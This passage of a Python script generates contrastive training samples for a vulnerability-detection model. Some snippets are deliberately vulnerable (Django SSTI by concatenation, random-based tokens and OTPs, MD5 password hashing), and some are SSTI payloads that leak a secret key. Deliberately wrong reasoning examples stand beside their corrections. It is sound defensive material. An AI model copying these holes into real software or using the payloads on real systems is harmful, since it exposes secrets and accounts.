   (a) 模板源码 "<h1>Welcome {{ user }}</h1>" 是固定字面量，模块级常量 GREETING_TPL 在加载时编译一次。
   (b) 用户输入 user 通过 render(user=user) 作为模板变量传入，而非拼接到模板源码。
   (c) 渲染时 {{ user }} 被替换为 user 的值。如果 user="{{7*7}}"，
       渲染结果是 "<h1>Welcome {{7*7}}</h1>"，7*7 不会被计算（不递归渲染变量值）。
   (d) SSTI 的前提是用户控制模板源码，本代码不满足此前提。
5. 结论：模板源码固定，用户输入作为变量传入，不存在 SSTI。代码安全。"""
)

# --- B7: Django Template + 用户输入拼接（漏洞） ---
add(
    """
from django.template import Template, Context
from django.http import HttpResponse


def greet(request):
    name = request.GET.get("name", "")
    template = Template("<h1>Hello " + name + "</h1>")
    context = Context({"name": name})
    return HttpResponse(template.render(context))
""",
    "python",
    "ccot_ssti_django_concat.py",
    True,
    "CWE-94 代码注入（SSTI）",
    "Critical",
    "request.GET.get('name')",
    "Template('<h1>Hello ' + name + '</h1>')",
    "用户输入 name 通过字符串拼接到模板源码，Django Template() 将其编译为模板。攻击者传入 name='{{ settings.SECRET_KEY }}' 可泄露 Django 密钥，传入 name='{% load %}' 可加载额外模板标签库",
    "使用固定模板 template = Template('<h1>Hello {{ name }}</h1>')，通过 Context 传入变量",
    """
代码用了 Django 的 Template()，Django 模板比 Jinja2 安全，不会执行任意 Python 代码。name 只是 Hello 后面的文本，应该是安全的。""",
    """
问题：模型有两个误解。(1) Django 模板引擎虽然比 Jinja2 受限（不能直接执行 Python 代码），但仍可通过 {% %} 标签加载标签库或访问上下文变量，如 {{ settings.SECRET_KEY }} 泄露密钥。(2) name 被拼接到模板源码 Template("<h1>Hello " + name + "</h1>")，不是作为变量传入。攻击者传入 name="{{ settings.SECRET_KEY }}" 会让模板源码包含 {{ settings.SECRET_KEY }}，渲染时泄露密钥。""",
    """
1. 污染源：request.GET.get('name') 获取用户输入。
2. 危险 sink：Template("<h1>Hello " + name + "</h1>") 将字符串编译为 Django 模板。
3. 数据流追踪：name → 字符串拼接到模板源码 → Template() 编译 → template.render(context) 执行。
4. 防御检查（无）：
   (a) 模板源码由用户输入拼接，未使用固定模板。
   (b) Django 模板引擎虽然比 Jinja2 受限，但 {{ }} 可访问上下文变量，{% %} 可加载标签库。
   (c) 攻击者传入 name="{{ settings.SECRET_KEY }}" → 渲染时泄露 Django 密钥。
   (d) 攻击者传入 name="{% debug %}" → 加载 debug 标签，可能输出调试信息。
5. 攻击路径：name="{{ settings.SECRET_KEY }}" → 泄露密钥。
6. 结论：用户输入拼入 Django 模板源码，存在 CWE-94 SSTI 漏洞。"""
)

# --- B8: Django Template + 固定模板（安全） ---
add(
    """
from django.template import Template, Context
from django.http import HttpResponse

GREETING_TPL = Template("<h1>Hello {{ name }}</h1>")


def greet(request):
    name = request.GET.get("name", "")
    context = Context({"name": name})
    return HttpResponse(GREETING_TPL.render(context))
""",
    "python",
    "ccot_ssti_django_fixed.py",
    False,
    "none",
    "None",
    "N/A",
    "N/A",
    "模板源码是固定字面量 '<h1>Hello {{ name }}</h1>'，模块级常量在加载时编译。用户输入 name 通过 Context({'name': name}) 作为模板变量传入，而非拼接到模板源码。模板引擎只渲染 {{ name }} 占位符为 name 的值，用户输入中的 {{ }} 不会被二次渲染",
    "no fix needed",
    """
代码用了 Django 的 Template()，存在 SSTI 风险。用户输入 name 通过 Context 传入，模板引擎可能执行用户输入中的 {{ }}。""",
    """
问题：模型把 Template() 当成 SSTI 的充分条件。本代码模板源码 "<h1>Hello {{ name }}</h1>" 是固定字面量，模块级常量 GREETING_TPL 在加载时编译。用户输入 name 通过 Context({'name': name}) 作为模板变量传入。渲染时 {{ name }} 被替换为 name 的值，如果 name="{{ settings.SECRET_KEY }}"，渲染结果是 "<h1>Hello {{ settings.SECRET_KEY }}</h1>"，不会被二次渲染。""",
    """
1. 污染源：request.GET.get('name') 获取用户输入。
2. 危险 sink：GREETING_TPL.render(Context({"name": name})) 渲染模板。
3. 数据流追踪：name → Context({'name': name}) 作为模板变量传入 → 模板引擎替换 {{ name }} 占位符。
4. 防御评估（模板源码固定）：
   (a) 模板源码 "<h1>Hello {{ name }}</h1>" 是固定字面量，模块级常量在加载时编译。
   (b) 用户输入 name 通过 Context 作为模板变量传入，而非拼接到模板源码。
   (c) 渲染时 {{ name }} 被替换为 name 的值。如果 name="{{ settings.SECRET_KEY }}"，
       渲染结果是 "<h1>Hello {{ settings.SECRET_KEY }}</h1>"，不会被二次渲染。
   (d) SSTI 的前提是用户控制模板源码，本代码不满足此前提。
5. 结论：模板源码固定，用户输入作为变量传入，不存在 SSTI。代码安全。"""
)


# ===========================================================================
# 类别 C: 结论一致性（6 条）
# 针对改进文档第一节 C 类错误：typical_19 推理对结论错
# 模型可能从训练数据学了"安全样本→输出 none"的模式，导致推理出问题也强行输出安全。
# ===========================================================================

# --- C1: random.choices 生成 token（漏洞，推理识别风险→结论必须 true） ---
add(
    """
import random

def generate_reset_token():
    return ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=16))
""",
    "python",
    "ccot_weak_random_choices.py",
    True,
    "CWE-330 弱随机数",
    "High",
    "random.choices() 伪随机数生成器",
    "generate_reset_token() 返回的 token",
    "random.choices 使用 Mersenne Twister 伪随机数生成器，其状态可被预测。如果用于生成密码重置 token、会话 ID 或 API Key，攻击者可通过收集足够输出推断 PRNG 状态，伪造有效 token。应使用 secrets 模块的密码学安全随机数生成器",
    "改用 secrets.token_urlsafe(16) 或 secrets.choice() 生成安全 token",
    """
random.choices 是伪随机数生成器，在某些安全敏感的应用中可能需要更高级别的随机性，建议用 secrets。""",
    """
以上推理识别出了风险（"伪随机数""需要更高级别的随机性""建议用 secrets"），但若结论标 has_vulnerability=false 就是典型的"结论漂移"——推理对、结论错。推理过程已明确指出 random.choices 不安全，结论必须与推理一致，标 true。""",
    """
1. 污染源：random.choices() 是 Python 的伪随机数生成器（基于 Mersenne Twister）。
2. 危险 sink：generate_reset_token() 用 random.choices 生成密码重置 token。
3. 数据流追踪：random.choices('abc...0123456789', k=16) → 拼接为 16 字符 token → 返回给调用方。
4. 防御检查（缺失）：
   (a) random 模块使用 Mersenne Twister PRNG，其内部状态可通过收集足够输出（约 624 个 32 位输出）推断。
   (b) 密码重置 token 是安全敏感场景，攻击者如果能预测 token 就能劫持账户。
   (c) Python 官方文档明确警告："该模块的随机数不适用于密码学用途"。
   (d) 应使用 secrets 模块（基于 os.urandom，密码学安全）。
5. 结论一致性校验：推理过程已识别 random.choices 是伪随机、不安全、建议用 secrets，结论必须与推理一致，标 has_vulnerability=true。
6. 结论：存在 CWE-330 弱随机数漏洞，密码重置 token 使用伪随机数生成。"""
)

# --- C2: secrets.token_urlsafe（安全，推理未识别风险→结论 false） ---
add(
    """
import secrets

def generate_reset_token():
    return secrets.token_urlsafe(16)
""",
    "python",
    "ccot_secrets_token_urlsafe.py",
    False,
    "none",
    "None",
    "N/A",
    "N/A",
    "secrets.token_urlsafe 使用 os.urandom 作为熵源，是 Python 官方推荐的密码学安全随机数生成器。os.urandom 调用操作系统的 CSPRNG（Linux 上是 /dev/urandom），输出不可预测，适合生成密码重置 token、会话 ID 等安全敏感场景",
    "no fix needed",
    """
secrets.token_urlsafe 是安全的随机数生成器，使用了密码学安全的熵源。代码生成密码重置 token 的方式正确。""",
    """
以上推理未识别出任何风险，结论标 has_vulnerability=true 就是"幻觉性判漏洞"。推理过程明确指出 secrets.token_urlsafe 是安全的、使用密码学安全熵源、代码正确，结论必须与推理一致，标 false。""",
    """
1. 污染源扫描：secrets.token_urlsafe(16) 调用 Python 官方密码学安全随机数生成器。
2. 危险 sink：generate_reset_token() 返回 token，但 token 生成方式安全。
3. 数据流追踪：secrets.token_urlsafe(16) → 基于 os.urandom → 操作系统 CSPRNG。
4. 防御评估（安全实现）：
   (a) secrets 模块是 Python 3.6+ 官方推荐的密码学安全随机数模块。
   (b) token_urlsafe(16) 调用 os.urandom(16) 获取 16 字节随机数据，Base64url 编码为 22 字符 token。
   (c) os.urandom 调用操作系统 CSPRNG（Linux: /dev/urandom），输出不可预测。
   (d) 与 random 模块（Mersenne Twister PRNG，可预测）不同，secrets 适合安全敏感场景。
5. 结论一致性校验：推理过程未识别出任何风险（secrets 是安全的），结论必须与推理一致，标 has_vulnerability=false。
6. 结论：使用 secrets.token_urlsafe 生成 token，密码学安全。代码安全。"""
)

# --- C3: random.random 生成验证码（漏洞，推理识别风险→结论必须 true） ---
add(
    """
import random

def generate_otp():
    code = random.randint(100000, 999999)
    return str(code)
""",
    "python",
    "ccot_weak_random_otp.py",
    True,
    "CWE-330 弱随机数",
    "High",
    "random.randint() 伪随机数生成器",
    "generate_otp() 返回的验证码",
    "random.randint 使用 Mersenne Twister 伪随机数生成器生成 6 位验证码。攻击者可通过收集足够验证码输出推断 PRNG 状态，预测后续验证码。验证码是安全敏感场景，应使用 secrets.randbelow(900000) + 100000 生成",
    "改用 secrets.randbelow(900000) + 100000 生成密码学安全验证码",
    """
random.randint 生成 6 位验证码，虽然 random 是伪随机数，但 6 位数字空间有 90 万种可能，暴力破解难度较大，可以接受。""",
    """
问题：推理识别了 random 是伪随机数，但结论"暴力破解难度较大，可以接受"是在为"安全"找借口。这是典型的结论漂移——推理发现了风险（伪随机数），却强行结论"可接受"。PRNG 的可预测性不是暴力破解问题，而是状态推断问题：攻击者收集足够输出可推断 PRNG 内部状态，直接预测后续验证码。结论必须与推理一致，识别出伪随机数风险就标 true。""",
    """
1. 污染源：random.randint(100000, 999999) 使用 Mersenne Twister PRNG。
2. 危险 sink：generate_otp() 返回 6 位验证码。
3. 数据流追踪：random.randint → 6 位数字 → str(code) → 返回验证码。
4. 防御检查（缺失）：
   (a) random.randint 使用 Mersenne Twister PRNG，状态可通过收集足够输出推断。
   (b) 验证码是安全敏感场景，攻击者如果能预测验证码就能绕过二步验证。
   (c) 6 位数字空间（90 万种）不能抵御 PRNG 状态推断攻击，攻击者收集约 624 个输出即可推断状态。
   (d) Python 官方文档明确警告 random 模块不适用于密码学用途。
   (e) 应使用 secrets.randbelow(900000) + 100000 生成密码学安全验证码。
5. 结论一致性校验：推理过程已识别 random 是伪随机数、不安全，结论必须与推理一致，标 has_vulnerability=true。不能以"暴力破解难度大"为由强行判安全。
6. 结论：存在 CWE-330 弱随机数漏洞，验证码使用伪随机数生成。"""
)

# --- C4: secrets.randbelow 生成验证码（安全，推理未识别风险→结论 false） ---
add(
    """
import secrets

def generate_otp():
    code = secrets.randbelow(900000) + 100000
    return str(code)
""",
    "python",
    "ccot_secrets_otp.py",
    False,
    "none",
    "None",
    "N/A",
    "N/A",
    "secrets.randbelow 使用 os.urandom 作为熵源，是密码学安全随机数生成器。生成 6 位验证码的方式正确，攻击者无法预测后续验证码",
    "no fix needed",
    """
secrets.randbelow 是密码学安全的随机数生成器，生成验证码的方式正确。代码没有使用 random 模块，不存在弱随机数风险。""",
    """
以上推理未识别出任何风险，结论标 has_vulnerability=true 就是"幻觉性判漏洞"。推理过程明确指出 secrets 是安全的、未使用 random 模块，结论必须与推理一致，标 false。""",
    """
1. 污染源扫描：secrets.randbelow(900000) 调用 Python 官方密码学安全随机数生成器。
2. 危险 sink：generate_otp() 返回验证码，但生成方式安全。
3. 数据流追踪：secrets.randbelow(900000) + 100000 → 6 位数字 → str(code) → 返回验证码。
4. 防御评估（安全实现）：
   (a) secrets 模块是 Python 3.6+ 官方推荐的密码学安全随机数模块。
   (b) secrets.randbelow(900000) 生成 0-899999 的随机数，+100000 确保 6 位（100000-999999）。
   (c) secrets.randbelow 内部调用 os.urandom，使用操作系统 CSPRNG，输出不可预测。
   (d) 攻击者无法通过收集验证码输出推断后续验证码。
5. 结论一致性校验：推理过程未识别出任何风险（secrets 是安全的），结论必须与推理一致，标 has_vulnerability=false。
6. 结论：使用 secrets.randbelow 生成验证码，密码学安全。代码安全。"""
)

# --- C5: MD5 哈希密码（漏洞，推理识别风险→结论必须 true） ---
add(
    """
import hashlib

def hash_password(password):
    return hashlib.md5(password.encode()).hexdigest()
""",
    "python",
    "ccot_md5_password.py",
    True,
    "CWE-327 弱密码学",
    "High",
    "hashlib.md5() 弱哈希算法",
    "hash_password() 返回的 MD5 哈希值",
    "MD5 是一种快速哈希算法，不适合密码存储。密码存储场景的 MD5 弱点不是碰撞攻击，而是哈希速度太快（GPU 每秒可计算数十亿次 MD5），攻击者获取哈希后可快速暴力破解。应使用 bcrypt、argon2 或 PBKDF2 等慢哈希算法，它们包含 salt 和工作因子",
    "改用 bcrypt.hashpw(password.encode(), bcrypt.gensalt()) 或 argon2",
    """
MD5 易于受到碰撞攻击，建议替换为 SHA-256。""",
    """
问题：推理有两个概念错误。(1) 密码存储场景的 MD5 弱点不是碰撞攻击（碰撞攻击是找两个不同输入产生相同哈希，对密码破解无帮助），而是哈希速度太快，GPU 可快速暴力破解字典中的密码。(2) 建议 SHA-256 也是错的——SHA-256 同样太快，不适合密码存储，应该用 bcrypt/argon2 等慢哈希。但关键是：推理虽然原因说错了，却识别出了"MD5 不安全"，结论必须标 true。不能因为推理原因不准确就结论标 false。""",
    """
1. 污染源：hashlib.md5(password.encode()) 使用 MD5 哈希算法。
2. 危险 sink：hash_password() 返回 MD5 哈希用于密码存储。
3. 数据流追踪：password → encode → md5 → hexdigest → 返回哈希值。
4. 防御检查（缺失）：
   (a) MD5 是快速哈希算法，GPU 每秒可计算数十亿次 MD5，攻击者获取哈希后可快速暴力破解。
   (b) 密码存储场景的弱点不是碰撞攻击（碰撞攻击对密码破解无帮助），而是哈希速度太快。
   (c) 未使用 salt，相同密码产生相同哈希，易受彩虹表攻击。
   (d) 应使用 bcrypt、argon2 或 PBKDF2 等慢哈希算法，包含 salt 和工作因子。
   (e) 注意：SHA-256 同样是快速哈希，不适合密码存储，不是正确的替代方案。
5. 结论一致性校验：推理过程已识别 MD5 不安全（虽然原因表述有误），结论必须与推理一致，标 has_vulnerability=true。
6. 结论：存在 CWE-327 弱密码学漏洞，密码存储使用 MD5 快速哈希算法。"""
)

# --- C6: bcrypt 哈希密码（安全，推理未识别风险→结论 false） ---
add(
    """
import bcrypt

def hash_password(password):
    salt = bcrypt.gensalt(rounds=12)
    return bcrypt.hashpw(password.encode(), salt).decode()
""",
    "python",
    "ccot_bcrypt_password.py",
    False,
    "none",
    "None",
    "N/A",
    "N/A",
    "bcrypt 是专为密码存储设计的慢哈希算法，包含自适应工作因子（rounds=12）和自动生成的 salt。rounds=12 意味着每次哈希计算需要 2^12=4096 次 bcrypt 迭代，有效抵御暴力破解。bcrypt 是 OWASP 推荐的密码哈希算法之一",
    "no fix needed",
    """
bcrypt.hashpw 使用了 salt 和工作因子，是安全的密码哈希方案。代码生成密码哈希的方式正确。""",
    """
以上推理未识别出任何风险，结论标 has_vulnerability=true 就是"幻觉性判漏洞"。推理过程明确指出 bcrypt 使用了 salt、工作因子、是安全的方案，结论必须与推理一致，标 false。""",
    """
1. 污染源扫描：bcrypt.gensalt(rounds=12) + bcrypt.hashpw 是密码学安全操作。
2. 危险 sink：hash_password() 返回密码哈希，但使用安全算法。
3. 数据流追踪：password → encode → bcrypt.hashpw(password, salt) → 返回 bcrypt 哈希。
4. 防御评估（安全实现）：
   (a) bcrypt 是专为密码存储设计的慢哈希算法（Blowfish-based）。
   (b) bcrypt.gensalt(rounds=12) 生成包含工作因子的 salt，rounds=12 意味着 2^12=4096 次迭代。
   (c) 工作因子可随硬件升级调整（rounds 参数），抵御未来算力提升。
   (d) 自动生成 salt，相同密码产生不同哈希，防止彩虹表攻击。
   (e) bcrypt 是 OWASP 推荐的密码哈希算法之一（与 argon2、scrypt 并列）。
5. 结论一致性校验：推理过程未识别出任何风险（bcrypt 是安全的），结论必须与推理一致，标 has_vulnerability=false。
6. 结论：使用 bcrypt + salt + rounds=12 哈希密码，符合安全最佳实践。代码安全。"""
)


# ===========================================================================
# 构建与写入逻辑
# ===========================================================================

def build_json_verdict(sample):
    """构造 JSON 结论块。"""
    verdict = {
        "has_vulnerability": sample["has_vulnerability"],
        "vulnerability_type": sample["vulnerability_type"],
        "risk_level": sample["risk_level"],
        "source": sample["source"],
        "sink": sample["sink"],
        "explanation": sample["explanation"],
        "fix_suggestion": sample["fix_suggestion"],
    }
    return "```json\n" + json.dumps(verdict, ensure_ascii=False, indent=2) + "\n```"


def build_messages(sample):
    """转为 ChatML，assistant 内容为 CCoT 对比格式。

    格式：错误推理 → 错误分析 → 正确推理 → JSON 结论
    """
    user_content = build_user_prompt(
        code=sample["code"], language=sample["language"],
        filename=sample["filename"],
    )
    json_block = build_json_verdict(sample)
    assistant_content = (
        f"### 错误推理路径（条件反射/偏见，需识别并避免）：\n"
        f"{sample['incorrect_reasoning']}\n\n"
        f"以上推理的问题：{sample['incorrect_flaw']}\n\n"
        f"### 正确推理路径：\n"
        f"{sample['correct_reasoning']}\n\n"
        f"### 最终结论：\n{json_block}"
    )
    return {
        "messages": [
            {"role": "system", "content": SYSTEM_PROMPT_LITE},
            {"role": "user", "content": user_content},
            {"role": "assistant", "content": assistant_content},
        ]
    }


def validate():
    """验证生成的样本。"""
    print("\n" + "=" * 60)
    print("验证 CCoT 对比样本")
    print("=" * 60)

    # 1. 数量检查
    assert len(SAMPLES) >= 20, f"样本数应 >= 20，实际 {len(SAMPLES)}"
    vuln_count = sum(1 for s in SAMPLES if s["has_vulnerability"])
    safe_count = len(SAMPLES) - vuln_count
    print(f"[OK] 样本数: {len(SAMPLES)} (vuln={vuln_count}, safe={safe_count})")

    # 2. 类别分布
    cat_a = [s for s in SAMPLES if s["filename"].startswith("ccot_subprocess") or s["filename"].startswith("ccot_shlex") or s["filename"].startswith("ccot_shell_true") or s["filename"].startswith("ccot_os_system")]
    cat_b = [s for s in SAMPLES if s["filename"].startswith("ccot_ssti")]
    cat_c = [s for s in SAMPLES if s["filename"].startswith("ccot_weak") or s["filename"].startswith("ccot_secrets") or s["filename"].startswith("ccot_md5") or s["filename"].startswith("ccot_bcrypt")]
    print(f"[OK] 类别分布: shell偏见={len(cat_a)}, SSTI混淆={len(cat_b)}, 结论一致={len(cat_c)}")

    # 3. CCoT 格式校验
    import re
    for i, sample in enumerate(SAMPLES):
        record = build_messages(sample)
        msgs = record["messages"]
        assert len(msgs) == 3, f"样本{i}: messages 应有 3 条"
        assert msgs[0]["role"] == "system"
        assert msgs[1]["role"] == "user"
        assert msgs[2]["role"] == "assistant"

        # system prompt 必须是 SYSTEM_PROMPT_LITE
        assert msgs[0]["content"] == SYSTEM_PROMPT_LITE, f"样本{i}: system prompt 不匹配"

        # assistant 必须含 CCoT 三段式 + json 块
        assistant = msgs[2]["content"]
        assert "### 错误推理路径" in assistant, f"样本{i}: 缺少错误推理路径段"
        assert "以上推理的问题" in assistant, f"样本{i}: 缺少错误分析段"
        assert "### 正确推理路径" in assistant, f"样本{i}: 缺少正确推理路径段"
        assert "### 最终结论" in assistant, f"样本{i}: 缺少最终结论段"
        assert "```json" in assistant, f"样本{i}: 缺少 json 块"

        # 提取 JSON 验证 schema
        json_match = re.search(r'```json\s*(\{.*?\})\s*```', assistant, re.DOTALL)
        assert json_match, f"样本{i}: 无法提取 JSON 块"
        verdict = json.loads(json_match.group(1))

        required_fields = ["has_vulnerability", "vulnerability_type", "risk_level",
                          "source", "sink", "explanation", "fix_suggestion"]
        for field in required_fields:
            assert field in verdict, f"样本{i}: JSON 缺少字段 {field}"

        # 安全样本 schema 约束
        if not sample["has_vulnerability"]:
            assert verdict["vulnerability_type"] == "none", f"样本{i}: safe 样本 vuln_type 应为 'none'"
            assert verdict["risk_level"] == "None", f"样本{i}: safe 样本 risk_level 应为 'None'"

        # 漏洞样本必须有具体 vuln_type
        if sample["has_vulnerability"]:
            assert verdict["vulnerability_type"] != "none", f"样本{i}: vuln 样本 vuln_type 不应为 'none'"

    print(f"[OK] 所有 {len(SAMPLES)} 条样本 CCoT 格式合规")

    # 4. 错误推理与正确推理不重复
    for i, s in enumerate(SAMPLES):
        assert s["incorrect_reasoning"] != s["correct_reasoning"], \
            f"样本{i}: 错误推理与正确推理相同"

    # 5. 代码不重复
    codes = [s["code"] for s in SAMPLES]
    unique_codes = set(codes)
    assert len(unique_codes) == len(codes), \
        f"代码有重复: {len(unique_codes)}/{len(codes)}"
    print(f"[OK] 代码唯一: {len(unique_codes)}/{len(codes)}")

    # 6. CoT 不重复
    cots = [s["correct_reasoning"] for s in SAMPLES]
    unique_cots = set(cots)
    assert len(unique_cots) == len(cots), \
        f"正确推理有重复: {len(unique_cots)}/{len(cots)}"
    print(f"[OK] 正确推理唯一: {len(unique_cots)}/{len(cots)}")

    # 7. 类别统计
    print("\n样本分布:")
    for s in SAMPLES:
        tag = "vuln" if s["has_vulnerability"] else "safe"
        print(f"  {s['filename']}: {tag} ({s['vulnerability_type']})")

    print(f"\n[OK] 所有验证通过")
    return True


def main():
    print(f"共 {len(SAMPLES)} 条 CCoT 对比样本")
    vuln = sum(1 for s in SAMPLES if s["has_vulnerability"])
    safe = len(SAMPLES) - vuln
    print(f"  漏洞样本: {vuln}  安全样本: {safe}")

    # 按类别统计
    cat_a = [s for s in SAMPLES if s["filename"].startswith("ccot_subprocess") or s["filename"].startswith("ccot_shlex") or s["filename"].startswith("ccot_shell_true") or s["filename"].startswith("ccot_os_system")]
    cat_b = [s for s in SAMPLES if s["filename"].startswith("ccot_ssti")]
    cat_c = [s for s in SAMPLES if s["filename"].startswith("ccot_weak") or s["filename"].startswith("ccot_secrets") or s["filename"].startswith("ccot_md5") or s["filename"].startswith("ccot_bcrypt")]
    print(f"  A. shell偏见: {len(cat_a)}  B. SSTI混淆: {len(cat_b)}  C. 结论一致: {len(cat_c)}")

    # 验证
    validate()

    # 写入
    os.makedirs(os.path.dirname(OUTPUT_FILE), exist_ok=True)
    with open(OUTPUT_FILE, "w", encoding="utf-8") as f:
        for sample in SAMPLES:
            record = build_messages(sample)
            f.write(json.dumps(record, ensure_ascii=False) + "\n")
    print(f"\n已写入: {OUTPUT_FILE}")

    # 验证写入的文件可被逐行解析
    print("\n验证写入文件...")
    count = 0
    with open(OUTPUT_FILE, encoding="utf-8") as f:
        for line_num, line in enumerate(f, 1):
            line = line.strip()
            if not line:
                continue
            rec = json.loads(line)
            assert "messages" in rec
            assert len(rec["messages"]) == 3
            count += 1
    assert count == len(SAMPLES), f"写入行数应为 {len(SAMPLES)}，实际 {count}"
    print(f"[OK] 文件包含 {count} 条有效 JSONL 记录")


if __name__ == "__main__":
    main()
